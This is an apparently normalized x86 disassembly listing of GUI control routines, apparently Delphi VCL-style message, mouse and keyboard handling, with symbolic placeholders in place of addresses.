add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_466768
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_466768
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44f3f4
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46ff14
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_4034ac
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_4666ac
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_4034ac
jmp r-xdata
sub_450c80
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408b28
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408b54
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_44f3f4
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_40896c
call sub_408908
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408908
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_450d28
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_450d58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_450d1c
push ebp
call sub_450d28
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450da8
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_450e34
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_450e6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_4508ec
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46661c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4034ac
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46661c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4034ac
sub_450ef0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44f3c4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44fa8c
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_450e6c
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_450f3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44f3c4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_450f58
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44f3c4
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44fa8c
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_450e6c
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_4034ac
sub_450fb0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_45088c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_450820
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_45088c
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_45104c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_450e6c
pop esi
pop ebx
retn
sub_451071
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_450e6c
pop esi
pop ebx
retn
sub_451097
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_450e6c
pop esi
pop ebx
retn
sub_4510c1
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_450e6c
pop esi
pop ebx
retn
sub_4510e7
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_45111c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_4508ec
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46661c
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_4034ac
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46661c
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_4034ac
sub_451194
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4511cc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46661c
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_4034ac
sub_451204
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_44fa8c
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4511cc
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406cdc
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034ac
sub_45127c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4511cc
pop esi
pop ebx
retn
sub_45129c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4511cc
pop esi
pop ebx
retn
sub_4512bc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_46661c
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_4034ac
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_45aa10
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451314
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44fa7c
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_44fa8c
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_450a20
pop esi
retn
sub_451354
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_450a54
sub_451402
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_44fc9c
mov cl 0x1
sub_451444
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_44f9f4
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44f9f4
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_451474
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_451498
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406cdc
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_4034ac
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_450a20
mov [ ebx + 0xc ] eax
sub_45153c
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44f948
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44f948
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_4515d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031f8
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_44efe8
mov edx [ esp ]
mov eax esi
call sub_44efc4
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_44f270
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_44f2b4
sub_451654
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_417330
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_44f36c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_417380
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44f214
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4516e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_4515d0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_456054
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_451654
pop ecx
jmp r-xdata
sub_451740
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45182e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451835
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44f884
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44f854
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44f854
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4044b8
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_404100
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44f774
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45183c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_4034ac
sub_451868
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_451888
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4518a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4518c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4518e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_451908
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_451928
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4217c0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_44eea8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4034ac
sub_451960
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4519fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419090
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_45c258
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_45c390
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f854
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45c0f0
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_45c4b0
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451a03
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_451a0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_451a48
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_451a0c
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_451af8
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_40343c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_451b2c
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_451b4c
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_4034ac
test al al
je r-xdata
mov eax edi
call sub_451b8c
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
